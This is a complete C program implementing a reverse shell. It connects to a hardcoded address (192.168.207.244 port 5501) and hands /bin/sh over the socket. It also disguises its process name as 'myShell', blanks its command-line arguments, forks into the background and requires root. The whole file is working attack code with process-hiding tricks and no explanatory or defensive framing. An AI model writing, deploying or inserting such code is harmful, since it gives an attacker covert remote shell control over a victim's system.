#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>           

void execute_shell(char *attackIP, unsigned short int attackPort){
    int sockfd;
    struct hostent *serv;
    struct sockaddr_in nodeAddr;
    
    //do socket setup
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)  return;
    serv = gethostbyname(attackIP);
    if(serv == NULL)  return;
    bzero((char *) &nodeAddr, sizeof(nodeAddr));
    nodeAddr.sin_family = AF_INET;
    bcopy((char *)serv->h_addr, (char *)&nodeAddr.sin_addr.s_addr, 
            serv->h_length);
    nodeAddr.sin_port = htons(attackPort);


    if(connect(sockfd,(struct sockaddr *)&nodeAddr,sizeof(nodeAddr)) < 0) 
        return;

    write(sockfd, "Reverse shell..\n", strlen("Reverse shell..\n"));
    dup2(sockfd, 0); 
    dup2(sockfd, 1); 
    dup2(sockfd, 2);
    execl("/bin/sh", "/bin/sh", (char *)0);
    close(sockfd);
}

int main(int argc, char *argv[]){ 
    //Prevent zombies
    signal(SIGCLD, SIG_IGN); 
    chdir("/");

    int i;
    //Renaming our process
    strncpy(argv[0], "myShell", strlen(argv[0]));
    for (i=1; i<argc; i++){
        memset(argv[i],' ', strlen(argv[i]));
    }
    if (fork() != 0)
        exit(0);
    
    if (getgid() != 0) {
        fprintf(stdout, "Run as root!\n");
        exit(EXIT_FAILURE);
    }    
    execute_shell("192.168.207.244",5501);
    return 0;
}